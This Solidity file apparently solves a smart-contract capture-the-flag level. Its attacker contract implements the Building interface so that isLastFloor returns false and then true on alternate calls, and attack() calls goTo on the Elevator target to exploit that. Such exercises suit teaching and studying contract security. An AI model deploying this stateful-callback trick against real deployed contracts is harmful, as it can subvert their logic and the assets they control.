// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Building, Elevator} from "./Elevator.sol";

contract ElevatorAttacker is Building {
    bool public s_flip = false;
    Elevator public s_elevator;

    constructor(address _elevator) {
        s_elevator = Elevator(_elevator);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        bool result = s_flip;
        s_flip = !s_flip;
        return result;
    }

    function attack() external {
        s_elevator.goTo(uint256(0));
    }
}
